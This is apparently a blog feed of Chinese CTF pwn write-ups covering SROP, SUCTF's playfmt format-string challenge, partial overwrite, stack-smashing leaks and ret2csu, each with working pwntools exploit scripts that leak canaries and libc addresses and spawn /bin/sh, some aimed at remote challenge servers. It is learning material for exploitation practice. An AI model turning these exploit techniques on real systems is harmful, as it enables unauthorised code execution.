    <content type="text"><![CDATA[SropSrop大概是一种，没有其他函数，找gadget会比较麻烦，无法利用来leak地址，借助signal handle机制’sigreturn’的系统调用，更改signal frame（这是一段代码）的一些寄存器的值做到系统调用，主要相关的寄存器有：rax（系统调用号）、rdi（存参）、rip（下一条指令）、rsp（栈顶），还有就是re_sigreturn（存sigreturn的系统调用号，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15） 偷偷搬运一下wiki里的图，这就是一个signal frame，最后执行完sigreturn之后会执行execve（‘/bin/sh’,0,0） 这里懂了，大概的原理就懂了一点了（其实我很懵）然后看到了我们的smallest 整个程序只有start函数，没办法调用write和puts这些来leak stack_addr，这就要用到我们的srop了。 首先看懂我们的程序到底在干啥，貌似是在执行read函数，但是我们在gdb里跑一遍是可以发现我们下一步是没有操作了的。然后我们知道read和write函数只是第一个参数不一样，那我们就改一下rax的值，看到有xor 操作就知道它置零了rax，我们要做的就是绕过那一步 那我们先让程序到start最开始的地方，即0x4000b0的地方，然后直接更改低位地址为b3，绕过置零的步骤，就成功调用write了，在leak之后我们还要返回这个程序，所以要再填入一个0x4000b0所以第一步我们发送三个起始地址实现leak 1payload = p64(start_addr) * 3 在实现leak之后就要想办法把execve（‘/bin/sh’,0,0）写入栈里，最后再实现调用 然后我们知道rax这个寄存器非常特殊，它除了被用来指定系统调用的调用号之外，也是函数返回值最后存放的地方。因此，我们可以利用控制函数返回值来控制rax寄存器的值。（其实我不知道的，所以看大佬wp的时候还一脸懵，不知道为啥非要填15个字符，想着又不是格式化字符串，看来还是我太菜了）然后我们将rax寄存器设置成15（sigreturn的系统调用号），然后调用一个syscall，这个效果就和调用一个sigreturn是一样一样的（所以在额外我们再次写入了syscall） 所以第二步是利用sigreturn构造read的frame，第三步是往栈里写入execve（‘/bin/sh’,0,0） 1234567891011121314151617181920212223242526272829sigframe = SigreturnFrame()sigframe.rax = constants.SYS_readsigframe.rdi = 0sigframe.rsi = stack_addrsigframe.rdx = 0x400sigframe.rsp = stack_addrsigframe.rip = syscall_retpayload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe)#把frame写入栈中sh.send(payload)## set rax=15 and call sigreturnsigreturn = p64(syscall_ret) + &apos;b&apos; * 7sh.send(sigreturn)## call execv(&quot;/bin/sh&quot;,0,0)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = stack_addr + 0x150 # &quot;/bin/sh&quot; &apos;s addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rsp = stack_addrsigframe.rip = syscall_retframe_payload = p64(start_addr) + &apos;b&apos; * 8 + str(sigframe) print len(frame_payload)payload = frame_payload + (0x150 - len(frame_payload)) * &apos;\x00&apos; + &apos;/bin/sh\x00&apos;sh.send(payload)sh.send(sigreturn) 完整的exp如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *from LibcSearcher import *small = ELF(&apos;./smallest&apos;)if args[&apos;REMOTE&apos;]: sh = remote(&apos;127.0.0.1&apos;, 7777)else: sh = process(&apos;./smallest&apos;)context.arch = &apos;amd64&apos;context.log_level = &apos;debug&apos;syscall_ret = 0x00000000004000BEstart_addr = 0x00000000004000B0## set start addr three times# gdb.attach(sh)payload = p64(start_addr) * 3sh.send(payload)gdb.attach(sh)## modify the return addr to start_addr+3## so that skip the xor rax,rax; then the rax=1## get stack addrsh.send(&apos;\xb3&apos;)stack_addr = u64(sh.recv()[8:16])log.success(&apos;leak stack addr :&apos; + hex(stack_addr))## make the rsp point to stack_addr## the frame is read(0,stack_addr,0x400)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_readsigframe.rdi = 0sigframe.rsi = stack_addrsigframe.rdx = 0x400sigframe.rsp = stack_addrsigframe.rip = syscall_retpayload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe)sh.send(payload)## set rax=15 and call sigreturnsigreturn = p64(syscall_ret) + &apos;b&apos; * 7sh.send(sigreturn)## call execv(&quot;/bin/sh&quot;,0,0)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = stack_addr + 0x150 # &quot;/bin/sh&quot; &apos;s addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rsp = stack_addrsigframe.rip = syscall_retframe_payload = p64(start_addr) + &apos;b&apos; * 8 + str(sigframe)print len(frame_payload)payload = frame_payload + (0x150 - len(frame_payload)) * &apos;\x00&apos; + &apos;/bin/sh\x00&apos;sh.send(payload)sh.send(sigreturn)sh.interactive() 放一张23R3F大佬的理解过程图，写得很明了了（不过关于p64(0)的地方为什么会变成syscall那长度为0xf的东西，我真的没理解到，感觉那个东西只是作为返回值，然后长度传给了rax，然后我一直以为p64（0）只是为了让frame如从上上图的结构，看来还得继续学习理解啊） 感觉srop就粗略的通过这题过了一下子，很多关于机制和寄存器的原理还是有点懵，底层知识还不扎实，要好好补补了 相关参考链接:https://www.freebuf.com/articles/network/87447.html srop的原理https://www.jianshu.com/p/b838a10b63c7 23R3F师傅的wp]]></content>
  </entry>
  <entry>
    <title><![CDATA[suctf的两三题wp]]></title>
    <url>%2F2019%2F08%2F20%2Fplayfmt%2F</url>
    <content type="text"><![CDATA[这次suctf我参与了的好像就三道题吧，还是和队友以及大佬商讨之后才弄出来的，发现自己真的太菜了 以下附上超级简单题的一些思路，当做给自己的记录吧 MT - crpyto这是个密码题，但是我re基础有点太弱了，纯靠逆估计得逆很久，那就选择爆破吧 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;unsigned int convert(unsigned int m) &#123; m = m ^ m &gt;&gt; 13; m = m ^ m &lt;&lt; 9 &amp; 2029229568ll; m = m ^ m &lt;&lt; 17 &amp; 2245263360ll; m = m ^ m &gt;&gt; 19; return m;&#125;int main() &#123; unsigned int i; for (i = 0; i &lt;= (unsigned int)0xffffffffll; i++) &#123; if (i &amp; 0xfffff == 0) printf(&quot;%u\n&quot;, i); if (convert(i) == (unsigned int)1679057065ll) &#123; printf(&quot;%u&quot;, i); break; &#125; &#125; return 0;&#125;//1679057065 2226413449//3818208026 2938293886//2854351778 1730632668 我们发现这道题就是把给的最终结果的flag切片，四个四个以字符的形式（两个十六进制数为一个）一循环，往函数里进行异或和位移操作 写python脚本的时候，崩溃了，跑不出来（能读的位太小？还是我python不熟啊？）换个c发现巨方便 falg : 84B45F89AF22CE7E67275BDC大写发现过不去，改成小写就可以了flag{84b45f89af22ce7e67275bdc} signup - re天知道第一道逆向竟然是rsa（看见熟悉的65537就知道了）把n丢到网站上分出两个质数然后直接丢给解rsa的脚本跑一下就出flag了（脚本来自超级可爱的队友，这里就不po出来了） flag是suctf{Pwn_@_hundred_years} Playfmt - pwn这道题，格式化字符串 看到这里觉得有些眼熟，这不是lab9的那个差不多吗，关键函数，漏洞位置都一样，然后我天真的以为可以套着lab9的方法做这道题，结果…我确实天真，写完脚本，疯狂get不到shell，发现地址没爆错啊，啥都没问题，那肯定是got表改不了的问题了，这个具体看程序函数，貌似是那个this指针？（this+1是指向flag的） 看程序就知道，flag是被读进了堆里，堆的地址，我不会分析，就直接爆破吧 偏移为6的位置作为第一个ebp，指向下一个地址，而下一个又指向了再下一个地址。偏移分别为6 、14 、26，蓝色字体的地址为heap的地址，选择爆破的话，泄露那个应该都OK我们知道flag是被写进堆里的，我们就把heap的地址存入ebp指向的地址处，同时会被存进26个偏移的位置（方便读取数据） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level = &apos;debug&apos;p = process(&apos;./playfmt&apos;)# p = remote(&apos;120.78.192.35&apos;,9999)elf = ELF(&apos;./playfmt&apos;)libc = ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)printf_got = elf.got[&apos;printf&apos;]system_libc = libc.symbols[&apos;system&apos;] printf_libc = libc.symbols[&apos;printf&apos;] def read_addr(target_addr): index1 = 6 #偏移是6的地方作为第一个ebp index2 = 14 #偏移是14的地方作为ebp2 --&gt; ebp里存的是ebp2的地址 value_ls = map(ord, p32(target_addr)) low_byte = stack_addr &amp; 0xfffor i in range(4): #stack地址就为ebp2处的地址，不变，heap的地址存在ebp2里，ebp2会指向ebp3，所以地址同时写入ebp3中#我对这个的理解是：第一处的payload代表每个ebp里的字节存入单字节heap的地址 payload = &apos;%&#123;&#125;c%&#123;&#125;$hhn\n\x00&apos;.format(low_byte + i, index1) p.sendline(payload) p.recvline() payload = &apos;%&#123;&#125;c%&#123;&#125;$hhn\n\x00&apos;.format(value_ls[i], index2) p.sendline(payload) p.recvline() success(&apos;target &apos; + hex(target_addr)) payload = &apos;%26$p\n\x00&apos; #ebp2指向的地址处，只存放target_addr，可直接读取 p.sendline(payload) p.recvline() payload = &apos;%26$s\n\x00&apos; p.sendline(payload)p.recv()payload = &apos;.%14$p.%18$p.\x00&apos; #%19$p也可p.sendline(payload)p.recvuntil(&quot;.&quot;)stack_addr = int(p.recv(10),16)success(&apos;stack &apos; + hex(stack_addr))p.recvuntil(&quot;.&quot;)heap_addr = int(p.recv(9),16)success(&apos;stack &apos; + hex(stack_addr))success(&apos;heap &apos; + hex(heap_addr))for i in range(-0x1000, 0, 0x4): #这里就随意循环heap的地址，找到flag字符，然后打印出来即可 success(&apos;offset &apos; + hex(i)) read_addr(heap_addr + i) ret = p.recvline() if &apos;suctf&apos; in ret: print(ret) p.interactive()p.interactive() 然后找大佬问了一下怎么确定flag到底写在了哪里，发现是我自己c和数据结构没学好……果然逆向基础和代码基础还是很重要的（一句话，我太菜了） V5是new出来的一个堆，这里的传参为this指针，v8是flag读入的堆，这里是a2（*this+1） Ida里找各个值的地址啥的New出来的v3为this，地址为[heap]0x08810E30其实看这个就能知道flag写在了末尾一个半字节为a10的地方，没关系，我们接着调。 我们输入%1$p发现它跳到了一个地方 发现其实它还没输出东西，那我们就继续往下执行，到printf执行之后，打印出第一个偏移处的地址 然后ida里，可以看见就在printf下面，那我们就算this的位置偏移是多少（数出来是19）我们修改一下ebp的地址，使他指向堆的地址（上面有说到第26个偏移的地方指向堆的地址，我们就把它改到ebp），然后我们把ebp2里指向的堆地址改成this+1的地址 我们tel一下查看堆里的信息，发现其实this+1里存的是flag的地址（上面的flag是自己本机的）然后我们就可以通过%19$s输出真实地址再把它写入ebp2，然后再执行%19$s就可以了Po个exp（来自一位特别特别好的大佬） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level = &apos;debug&apos;p = remote(&apos;120.78.192.35&apos;,9999)elf = ELF(&apos;./playfmt&apos;)p.recv()payload = &apos;%6$p&apos;p.sendline(payload)sleep(1)################## ebp&amp;retlog_ebp = int(p.recv(),16)#logo ebp 14$ 0xffffd048do_fmt_ebp = log_ebp - 0x20#do fmt ebp 6$ 0xffffd028do_fmt_return = log_ebp -0x1c#do_fmt return_to 7$log.info(&quot;log_ebp--&gt;p[%s]&quot;%hex(log_ebp))log.info(&quot;do_fmt_ebp1--&gt;p[%s]&quot;%hex(do_fmt_ebp))log.info(&quot;do_fmt_return--&gt;p[%s]&quot;%hex(do_fmt_return))#################3 this_addr,flag_addr_offpayload = &apos;%19$p&apos;p.sendline(payload)sleep(1)heap_addr=int(p.recv(),16)#0x8050e30flag_addr_off=heap_addr+4 #0x8050e34log.info(&apos;heap_addr--&gt;p[%s]&apos;%hex(heap_addr))log.info(&apos;flag_addr_off--&gt;p[%s]&apos;%hex(flag_addr_off))################# change this to *flag on stackheap_addr_part=heap_addr &amp; 0xFF#0e30log_ebp_part=log_ebp &amp; 0xFF#d048heap_addr_stack_part=(log_ebp+0x14)&amp;0xFF#D05clog.info(&apos;heap_addr_part--&gt;p[%s]&apos;%hex(heap_addr_part))log.info(&apos;log_ebp_part--&gt;p[%s]&apos;%hex(log_ebp_part))log.info(&apos;heap_addr_stack_part--&gt;p[%s]&apos;%hex(heap_addr_stack_part))payload=&apos;%&apos;+str(heap_addr_stack_part)+&apos;d%6$hhn&apos;p.sendline(payload)p.recv()payload=&apos;%&apos;+str(heap_addr_part+4)+&apos;d%14$hhn&apos;p.sendline(payload)p.recv()#gdb.attach(p)################# leak flag_addrpayload=&apos;%19$s\x00&apos;p.sendline(payload)flag_addr=u32(p.recv(4))#################payload=&apos;%&apos;+str(flag_addr&amp;0xFFFF)+&apos;d%14$hn&apos;p.sendline(payload)p.recvuntil(&apos;134515884&apos;) #%1$p的地址 0x8048CACp.sendline(&apos;%19$s\x00&apos;)p.interactive()` 我们前面不是可以知道那个flag到底是读在了a10的地方吗？那我们就直接改一个，把一个指向栈地址的改成指向堆地址的地址，就是偏移为6的那个地方啦，然后直接修改堆的低地址（18偏移的地方地址为a28,离flag的地方特别近，直接改低一个字节的地址就可以了，贼方便了） 1234567891011121314151617181920#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level = &apos;debug&apos;# p = remote(&apos;120.78.192.35&apos;,9999)p = process(&apos;./playfmt&apos;)elf = ELF(&apos;./playfmt&apos;)p.recvuntil(&quot;=\n&quot;)p.sendlineafter(&quot;=\n&quot;,&quot;%6$p&quot;)s = p.recvuntil(&quot;\n&quot;)stack_addr = int(s.strip(),16)print hex(stack_addr)stack = stack_addr + 0x10p.sendline(&quot;%&quot; + str(stack&amp;0xff) + &quot;c%6$hhn&quot;)p.sendline(&quot;%16c%14$hhn&quot;)p.sendline(&quot;%18$s&quot;)p.interactive() 这道题真实的flag好像是suctf{P_rin_Tfo}]]></content>
  </entry>
  <entry>
    <title><![CDATA[partial overwrite]]></title>
    <url>%2F2019%2F08%2F16%2Foverwrite%2F</url>
    <content type="text"><![CDATA[partial overwrite我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。（对于绕过PIE的操作我是没怎么接触过的）大概就是用字节覆盖修改地址，使程序跳转到我们想用的函数上去 Babypie这是一道保护全开的题 看到主程序，发现有两处写入 Read函数的最大问题大概就是它不会给末尾加’\0’所以可以leak地址leak canary在第一次 read 之后紧接着就有一个输出, 而 read 并不会给输入的末尾加上 \0, 这就给了我们 leak 栈上内容的机会。为了第二次溢出能控制返回地址, 我们选择 leak canary. 可以计算出第一次 read 需要的长度为 0x30 - 0x8 + 1 （因为canary的低位是\x00截断符，先用\x01去覆盖这个低位，然后打印出来后面的7位，最后加上\x00即可）、 发现有个可以直接getshell的函数，直接可以调用我们用第一个输入点把canary爆出来，然后第二个调用可以直接getshell的函数 然后exp的话，因为开了PIE所以只能知道低三位的地址，第四位得靠爆（真的是随缘的那种） 123456789101112131415161718192021#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *while True: try: p = process(&apos;./babypie&apos;) p.sendafter(&apos;:\n&apos;,&quot;a&quot;*(0x30-0x8+1)) p.recvuntil(&quot;a&quot;*(0x30-0x8+1)) canary = &apos;\0&apos; + p.recvn(7) print &quot;canary:&quot; + hex(u64(canary)) p.sendafter(&quot;:\n&quot;, &apos;a&apos; * (0x30 - 0x8) + canary + &apos;bbbbbbbb&apos; + &apos;\x3E\x0A&apos;) p.interactive() except EOFError: p.close() continue 爆破了n遍之后终于。。。 然后发现，直接覆盖低两位地址就好了嘛！（read和system的函数贼接近，前面都是一样的，真的是要哭了） 12345678910111213#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *p = process(&apos;./babypie&apos;)p.sendafter(&apos;:\n&apos;,&quot;a&quot;*(0x30-0x8+1))p.recvuntil(&quot;a&quot;*(0x30-0x8+1))canary = &apos;\0&apos; + p.recvn(7)print &quot;canary:&quot; + hex(u64(canary))payload = &apos;&apos;payload += &apos;a&apos;* 0x28 + canary + &apos;aaaaaaaa&apos; + &apos;\x3E&apos;p.send(payload)p.interactive() 效果长这样 gets这题没开pie，但它选择覆盖那里我还是挺懵的，就是两个真实地址，libc_start_main+192 和 _dl_init+139我们到底选择覆盖哪个呢？这就很茫然了Wiki上说的是：我们一般要覆盖字节的话，至少要覆盖 1 个半字节才能够获取跳到 onegadget。然而，程序中读取的时候是 gets读取的，也就意味着字符串的末尾肯定会存在\x00。而我们覆盖字节的时候必须覆盖整数倍个数，即至少会覆盖 3 个字节，而我们再来看看libc_start_main+240 的地址 0x7ffff7a2d830（我这里是800），如果覆盖 3 个字节，那么就是 0x7ffff700xxxx，已经小于了 libc 的基地址了，前面也没有刻意执行的代码位置。一般来说 libc_start_main 在 libc 中的偏移不会差的太多，那么显然我们如果覆盖 __libc_start_main+240 ，显然是不可能的。而 ld 的基地址呢？如果我们覆盖了栈上_dl_init+139，即为0x7ffff700xxxx。而观察上述的内存布局，我们可以发现libc位于 ld 的低地址方向，那么在随机化的时候，很有可能 libc 的第 3 个字节是为\x00 的。举个例子，目前两者之间的偏移为0x7ffff7dd7000-0x7ffff7a0d000=0x3ca000那么如果 ld 被加载到了 0x7ffff73ca000，则显然 libc 的起始地址就是0x7ffff7000000。然后就理所当然选_dl_init了（我觉得可能是libc是程序开始的地方，离我们要覆盖到的地址有点远，所以选一个近一点的） 所以由上面调试的截图可以看出，我们输完0x18个字符下一个ret处就是libc的地址了，而init离它还有18个偏移(a8-18=90—&gt;8个字节为一个偏移） 然后我们找一个能用的onegadget我们写个payload看看可不可以跑（估计要跑个六七万次，太难了啊） 1234567891011121314151617181920212223242526272829303132#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *common_gadget = 0x40059Bdef exp(): for i in range(0x100000): # if args[&apos;REMOTE&apos;]: # p = remote(ip, port) # else: # p = process(&apos;./gets&apos;) # # gdb.attach(p) p = process(&apos;./gets&apos;) try: payload = 0x18 * &apos;a&apos; + p64(common_gadget) for _ in range(2): payload += &apos;a&apos; * 0x28 + p64(common_gadget) payload += &apos;a&apos; * 0x28 + &apos;\x16\02&apos; p.sendline(payload) p.sendline(&apos;ls&apos;) data = p.recv() print data p.interactive() p.close() except Exception: p.close() continueif __name__ == &quot;__main__&quot;:exp() 之前偶然跑出来一次，然后再没跑出来了……先放个exp，改天再试试]]></content>
  </entry>
  <entry>
    <title><![CDATA[ssp操作]]></title>
    <url>%2F2019%2F08%2F16%2Fssp%2F</url>
    <content type="text"><![CDATA[用于开了canary的程序（无法正常爆破canary）就借助这种操作，打印出栈内的字符串就是通过栈溢出报错信息，泄漏出指定地址的方法： stack smashing detected:+argv[0]如果我们覆盖argv[0]，便会输出特定字符串 满足条件为1、开了canary2、Flag在程序内 看wiki里的花式栈溢出的时候看到的题（其实我很迷为啥把它放到花式栈溢出里，之后再细细研究吧） 关于stack smash 这个有点开拓我知识面了，对于canary我一直很迷，看到这里才知道canary操作起来是个啥样子的。Wiki原话： 在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行?__stack_chk_fail?函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。代码如下 123456void __attribute__ ((noreturn)) __stack_chk_fail (void)&#123; __fortify_fail (&quot;stack smashing detected&quot;);&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;, msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);&#125; 所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在?__fortify_fail?函数中就会输出我们想要的信息 smashes所以我们要找argv[0]的地址，（因为我们要求的偏移就是argv[0] 距离读取的字符串的偏移） 程序名指向的地址为e159，但是dd98里存放的是指向程序名的地址，所以我们需要的地址为后者接着在输入的地方下个断点，找上一个rsp作为字符串开始的地址 然后我们就可以算偏移了 所以我们的偏移为0x218 看程序会发现在一个地方会有flag的输出 但是我们看不到flag是什么最无奈的是我们输入的内容会覆盖整个地址，所以我们没有办法直接读出我们只能去找另一处的flag地址，这就接触到里另一个新的知识点了： 1在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用 gdb 的 find 来进行查找（pwndbg的话就用search吧） 现在就可以写exp了 12345678910111213141516#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *# p = process(&apos;./smashes&apos;)p = remote(&apos;pwn.jarvisoj.com&apos;, 9877)flag = 0x0400D20payload = &quot;a&quot;*0x218 + p64(flag)p.recvuntil(&apos;name? &apos;)p.sendline(payload)p.recvuntil(&apos;flag: &apos;)p.sendline(&apos;CTF&apos;)p.interactive() 这里很坑的就是我找flag是按照程序里给的格式找的，是CTF开头的，但是真正的flag是PCTF（0x600d20那个位置的0x50转字符就是P），所以它的地址得再往前拨一位 GUESS再来做道GUESS这题有三次的输入，我们可以通过三次输入实现我们的leak和读取flag，这题和上面那题的思路大概是一致的，都是读取栈上的字符串，而不需要getshell（上面那题是可以知道flag具体存在哪里了，这题需要libc找） 本题思路： 1.泄漏libc的基址2.泄漏environ的地址（也就是栈的地址）3.泄漏flag 三次泄漏都用到了上一题说的ssp，就是通过栈溢出报错信息，泄漏出指定地址的方法：stack smashing detected:+argv[0]如果我们覆盖argv[0]，便会输出特定字符串 对environ很迷的我看了一下23R3F大佬的wp，又发现了新的玩意儿(以下来自大佬博客https://www.jianshu.com/p/cc9d09a3f65f)： 12345在linux应用程序运行时，内存的最高端是环境/参数节（environment/arguments?section）用来存储系统环境变量的一份复制文件，进程在运行时可能需要。例如，运行中的进程，可以通过环境变量来访问路径、shell?名称、主机名等信息。该节是可写的，因此在格式串（format?string）和缓冲区溢出（buffer?overflow）攻击中都可以攻击该节。*environ指针指向栈地址(环境变量位置)，有时它也成为攻击的对象，泄露栈地址，篡改栈空间地址，进而劫持控制流。 好，我们按照刚刚那题的解题步骤，先找argv[0]和字符串开始的地方来计算偏移 算出偏移我们就可以按照思路来写exp了前面两个part如下： 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import *p = process(&apos;./GUESS&apos;)elf = ELF(&apos;./GUESS&apos;)libc = ELF(&apos;./libc.so.6&apos;)puts_got = elf.got[&apos;puts&apos;]# open_flag = 0x400A9A# argv = 0x7fffffffdda8# rsi_addr = 0x7fffffffdc80# distance = 0x128payload = &quot;a&quot;*0x128 + p64(puts_got)p.sendline(payload) p.recvuntil(&apos;stack smashing detected ***: &apos;) puts_addr = u64(p.recvuntil(&apos; &apos;)[:-1]+&apos;\x00\x00&apos;) # puts_addr = u64(p.recvuntil(&apos; &apos;)[:-1]) print &quot;puts_addr:&quot;+hex(puts_addr)libc_base = puts_addr - libc.symbols[&apos;puts&apos;] environ_addr = libc_base + libc.symbols[&apos;_environ&apos;] print &quot;libc_base:&quot;+hex(libc_base) print &quot;environ:&quot;+hex(environ_addr)payload = &apos;a&apos;*0x128 + p64(environ_addr) p.sendline(payload) p.recvuntil(&apos;stack smashing detected ***: &apos;) stack_addr = u64(p.recvuntil(&apos; &apos;)[:-1]+&apos;\x00\x00&apos;) # stack_addr = u64(p.recvuntil(&apos; &apos;)[:-1]) print &quot;stack_addr:&quot;+hex(stack_addr) 然后我们要算出buf与environ的差值，使程序跳转到flag的位置 构造最后一步的payload 12payload = &apos;a&apos;*0x128 + p64(stack_addr-0x168)p.sendline(payload) 最后效果 其实还是挺迷的，以后碰到题可能还会懵，先记录着吧]]></content>
  </entry>
  <entry>
    <title><![CDATA[libc_csu]]></title>
    <url>%2F2019%2F07%2F08%2Flibc-csu%2F</url>
    <content type="text"><![CDATA[_libc_csu1、Ret2csu 这是一个64位的题，开了NX，照常，进ida里瞄瞄它的大体结构是怎样的。Emmm真是一个异常简洁的main函数 我们发现它有个pwnme函数哦，那就点进去看一下 它里面说了ret2win 的第三个参数（rdx）必须为“0xdeadcafebabebeef”，异或出来是“/bin/cat”，先记住它。然后它还有一堆的赋值为0的语句，手欠点开来看，发现它把got表全置0了，那么我们就完全不用考虑got表。 然后我们会看到还有一个ret2win函数 看到system就知道我们的getshell的关键步骤就在这里了，最后就是要把地址指向ret2win这个函数的，所以下一步就是要去找gadget。 我们知道ret2win的第三个参数是与rdx有关的，但是我们找不到关于rdx的gadget，所以只能另辟他径。ret2csu这类题目貌似就是通过__libc_csu_init函数的操作（很多gadget的函数） 由函数体关系得知rbx=0rbp=1（rbp=rbx+1）r12：存调用函数的地址r13：函数的第一个参数r14：函数的第二个参数r15：函数的第三个参数（a3/rdx） 然后还有一个很严重的问题，有一个setvbuf函数，据大佬所说是会把rdx的值赋值为0xfffffff，然后无法调用ret2win，所以导致在call处程序出错，无法再执行下去（但是我是在是调不到setvbuf那个函数的地方，下断点也没找到那个赋值语句）然后只能选用一个程序的初始化用的函数地址， 就这两个函数的地址，用这两个函数写入r12里，躲过setvbuf，然后就可以getshell了。 rdx是由r15传值得到的，而刚好下面的一系列操作包括r15的，所以这些gadget可用，上面的函数有个跳转指令，为了使他不跳转，我们可以直接对rbx和rbp赋值，rbx为0，rbp为1。我们先pop这些寄存器，并且赋值，再进入mov，最后在call的地方调用ret2win，所以r12存的应该是ret2win的地址。理清得差不多了，就开始写exp了 12345678910111213141516171819202122232425from pwn import *sh = process('./ret2csu')#bss = 0x0601060start = 0x0400880#mov rdx, r15;mov rsi, r14;mov edi, r13d;call qword ptr [r12+rbx*8]end = 0x0400896#add rsp, 8;pop rbx;pop rbp;pop r12/r13/r14/r15init = 0x0600E10win = 0x04007B1payload = "a"*0x20+p64(0)payload += p64(end)payload += p64(0)payload += p64(0)#rbxpayload += p64(1)#rbppayload += p64(init)#r12payload += p64(0)#r13payload += p64(0)#r14payload += p64(0xdeadcafebabebeef)#r15(rdx)payload += p64(start)payload += "a"*56payload += p64(win)sh.sendline(payload)sh.interactive() 运行之后就拿到flag了 level5Ida里打开main函数 发现这个程序调用了write和read两个函数。没有system没有“/bin/sh”看到了熟悉的gadget 再看看在write和read里面，参数分别是存入哪些寄存器 Write Read 易知第三个参数存入edx（rdx），第二个是esi（rsi），第三个是edi（rdi）在上面的万用gadget里我们知道rdx的值来自于r13，rsi来自于r14，edi来自于r15d 我们要做的是（1）、先调用write函数把read/write函数的真实地址泄露出来（运行程序的时候这两个函数被调用了）找到system或者execve的真实地址（2）、用read函数，把system（“/bin/sh”）写进bss段里(system在bss里，即bss_addr，”/bin/sh”在bss的下一个地址,即bss_addr+8（3）、调用system函数达成getshell 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *from LibcSearcher import *p = process("./level5")elf = ELF('./level5')write_got = elf.got['write']read_got = elf.got['read']#bss_base = elf.bss()bss_addr = 0x0601040start_addr = 0x0400600 #add rsp, 8 pop rbx,rbp,r12,r13,r14,r15end_addr = 0x040061A #mov rdx,13 rsi,r14 eid,r15 call_start = elf.symbols['_start']def csu(rbx,rbp,r12,r13,r14,r15,_start): payload = "a"*0x80 +p64(0) payload += p64(end_addr)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15) payload += p64(start_addr)+"a"*0x38 payload += p64(_start) p.send(payload) sleep(1)p.recvuntil('Hello, World\n')csu(0,1,write_got,8,write_got,1,_start)write_addr = u64(p.recv(8))libc = LibcSearcher('write',write_addr)offest = write_addr-libc.dump('write')system_addr = libc.dump('system')+offestp.recvuntil("Hello, World\n")csu(0,1,read_got,16,bss_addr,0,_start)p.send(p64(system_addr)+"/bin/sh\x00")p.recvuntil("Hello, World\n")csu(0,1,bss_addr,0,0,bss_addr+8,_start)p.interactive() 运行结果 OJ level5题目说假设system和execve被禁用，用mmap和mprotect实现getshell。所以我们需要自己将shellcode写进bss段里。 科普一下mmap和mprotect 我们通过函数mmap来告诉操作系统把哪个文件映射哪块内存去，并且设置我们可能对这块内存的不能操作，就是对文件一样。 1234#include&lt;sys/mman.h&gt;void* mmap(void* addr, size_t len, int port, int flag, int filedes, off_t off)返回值：成功返回被映射的内存地址，失败返回MAP_FIALED 参数 addr这个只有在极少数情况下才不为0，这个参数告诉内核使用addr指定的值来映射指定文件。当指定为0的时候，告诉内核返回什么地址内其自身决定。除非非常了解系统进程模式，或者对当前环境非常了解，否则的话手工指定这个值总是不可取。参数 len指定被映射的内存区域的长度。参数 port这个参数对应open函数的权限位，我们可以指定为：PROT_READ，映射区可读；PROT_WRITE，映射区可写；PROT_EXEC，映射区可执行；PROT_NONE，映射区不可访问。由于只能映射已经打开的文件，所以这个权限位不能超出open函数指定的权限，比如说在open的时候指定为只读，那就不能在此时指定PORT_WRITE。参数 flag这个参数指定了映射区的其它一些属性，权限的属性已经在port中指定。这里可能存在的典型值有：MAP_FIXED，针对addr属性，如果指定这个位，那么要求系统必需在指定的地址映射，这往往是不可取的；MAP_SHARED，此标志说明指定映射区是共享的，意思就是说对内存的操作与对文件的操作是相对应的，它不能与MAP_PRIVATE标志一直使用，因为它们表达的意图是相反的；MAP_PRIVATE，该标志说明映射区是私用的，此时被映射的内存只能被当前里程使用，当进程操作的内存将会产生原文件的一个副本。 mprotect 函数可以更改一个已经存在的映射区的访问权限。 1234#include&lt;sys/mman.h&gt;int mprotect(void* addr, size_t len, int port)返回值：成功返回0，失败返回-1 参数 addr这个参数是mmap返回的数值，此时它就是mprotect作用的范围。参数 len指定映射区的长度，它需要与mmap中指定相同。参数 port在上面我们已经介绍了port的可能取值，mprotect功能就是把这个port指定的属性施加于相应的映射区上。 好，我们来看题 开了NX既然题目有提示一个更改权限的函数，那我们就去看一下bss段的权限，应该是禁止执行了的 readelf -S先找到bss的地址 vmmap查看权限，bss段的地址为0x600a88 ，在0x600000-0x601000之间，不可执行 